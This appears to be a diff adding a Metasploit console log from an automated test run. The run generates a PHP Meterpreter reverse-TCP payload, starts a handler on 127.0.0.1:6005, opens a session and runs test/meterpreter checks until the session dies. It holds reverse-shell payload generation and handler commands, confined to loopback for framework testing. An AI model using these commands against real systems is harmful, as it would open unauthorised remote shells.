@@ -1,0 +1,27 @@
+use php/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-3363-dm3jkr.php -f raw AutoVerifySessionTimeout=10 lport=6005 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-3363-dm3jkr.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 4
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6005 
+[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:49325 ) at 2022-02-05 19:51:53 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=5 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[*] Running against session 5
+[*] Session type is meterpreter and platform is osx
+before running test: should enumerate supported core commands
+[+] should enumerate supported core commands
+before running test: should support 3 or more core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+before running test: should return its own process id
+[*] Pid: 3767
+[+] should return its own process id
+before running test: should return a list of processes
+[*] 127.0.0.1 - Meterpreter session 5 closed.  Reason: Died
